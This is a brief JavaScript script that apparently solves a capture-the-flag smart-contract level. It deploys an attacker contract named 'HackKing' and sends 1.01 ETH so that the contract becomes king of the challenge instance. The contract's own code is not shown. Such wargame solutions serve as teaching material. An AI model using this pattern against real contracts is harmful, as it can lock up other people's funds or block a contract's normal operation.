const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load attacker contract')
    let attacker = loader.web3.fromArtifact('HackKing')
    console.log('Deploy attacker contract...')
    const { options: { address } } = await attacker.deploy().send()
    console.log('Load deployed attacker contract')
    attacker = loader.web3.fromArtifact('HackKing', address)
    console.log('Let attacker contract become king, sending 1.01 ETH...')
    await attacker.methods.becomeKing(instance).send({ value: web3.utils.toWei('1.01', 'ether') })
    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
